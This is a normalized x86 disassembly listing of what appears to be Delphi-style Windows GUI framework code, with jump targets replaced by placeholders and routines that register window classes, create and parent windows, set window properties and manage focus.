mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_414170
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43a068
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43ac60
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_4141ec
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_414170
mov edx eax
mov ecx ebx
mov eax edi
call sub_439fdc
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43a618
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_43ac9c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_43ac60
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_43ac60
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43a66c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43a618
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43a74b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_43a4a8
pop ecx
push ebp
mov al 0x2
call sub_43a4a8
pop ecx
push ebp
mov al 0x3
call sub_43a4a8
pop ecx
push ebp
mov al 0x4
call sub_43a4a8
pop ecx
push ebp
mov al 0x5
call sub_43a4a8
pop ecx
push ebp
mov al 0x6
call sub_43a4a8
pop ecx
push ebp
xor eax eax
call sub_43a4a8
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403294
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403490
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_43a770
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43e270
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a804
xor eax eax
push ebp
push sub_43a7f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43a80c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_43a834
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43a8f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4371b0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a900
mov eax [ ebp - 0xc ]
call sub_403294
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov edx eax
mov eax [ ebp - 0xc ]
call sub_414014
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_436f1c
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_414170
xor ecx ecx
mov edx 0xb03e
call sub_438978
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_43a908
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ac9c
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_43a804
xor edx edx
push ebp
push sub_43a9ef
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_43ac9c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403490
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov edx eax
mov eax [ ebp - 0xc ]
call sub_414014
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_414170
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403294
mov eax [ ebp - 0x4 ]
call sub_43a80c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43ac60
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_436cc0
mov dl 0x4
call sub_436cc0
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_414060
sub_43aa5c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44e0a8
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_451dcc
sub_43aa7c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4360a0
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4360a0
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4360a0
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_43aac8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_4360c8
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_4360c8
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_4360c8
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_43ab10
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403490
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_438978
mov edx ebx
mov eax edi
call sub_43aa7c
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_438978
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_438978
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_438978
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax edi
call sub_43e270
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_438978
mov eax edi
call sub_43b660
jmp r-xdata
mov edx ebx
mov eax edi
call sub_43a770
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43abe4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_438978
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax esi
call sub_43e270
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_43aa5c
mov eax ebp
call sub_43b4c4
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43aac8
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_438978
mov eax esi
call sub_43a82c
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_437bf4
sub_43ac60
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_414170
mov edx edi
mov eax ebp
call sub_414170
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43acbc
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_43ac9c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_43ac60
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_43acfc
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_43acbc
add esp 0x10
retn
sub_43ad24
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_43ad90
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_437e08
test al al
je r-xdata
mov eax ebx
call sub_437e38
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403490
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403490
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403490
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_43adf8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43af16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402ca4
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_43ad90
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_43df6c
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_4031e4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4042b4
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4086cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43af1d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_43af24
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_43b0e5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx r-xdata
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] r-xdata
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5cc
call sub_403a08
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40cb00
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40cb00
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408880
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_43e27c
push 0x1
mov eax [ esi + 0x68 ]
call sub_41d9cc
mov ecx eax
mov edx 0x30
mov eax esi
call sub_438978
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_43df6c
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b0ec
lea eax [ ebp - 0xc0 ]
call sub_404050
retn
mov eax esi
mov si 0xffee
call sub_403490
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_43b0f4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406a34
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_43b134
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41881c
mov eax esi
call sub_41876c
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41876c
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_418824
pop esi
pop ebx
retn
sub_43b16c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41a068
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_419ff4
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_419ff4
mov eax esi
call sub_41a070
add esp 0x10
pop esi
pop ebx
retn
sub_43b1d4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_43b1c0
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_414170
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414170
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_43b2ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_438cb0
mov eax [ ebp - 0x8 ]
push eax
push sub_43b134
mov eax [ ebp - 0x8 ]
push eax
push sub_43b16c
push ebp
call sub_43b1d4
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43b308
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_437720
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408834
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408848
mov ecx eax
mov edx edi
mov eax ebx
call sub_437730
mov eax r-xdata
call sub_408854
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_4361d4
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_43b360
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_43b3ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b3b4
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40cb00
sub_43b3c4
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_4141cc
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_414170
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_43b40c
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_43ac9c
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_43b3c4
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_43ac60
call sub_436e00
inc edi
dec esi
jne r-xdata
sub_43b4a8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_43b4c4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_414170
call sub_43b4c4
inc edi
dec esi
jne r-xdata
sub_43b524
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403490
mov ebx eax
mov eax edi
call sub_43b4c4
mov eax edi
call sub_43b660
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_43b564
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_43b63a
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_438978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414170
call sub_43b564
inc esi
dec ebx
jne r-xdata
sub_43b660
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403420
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43b564
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_43b6a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_43b4c4
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_43b660
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406a1c
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_438978
jmp r-xdata
sub_43b728
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
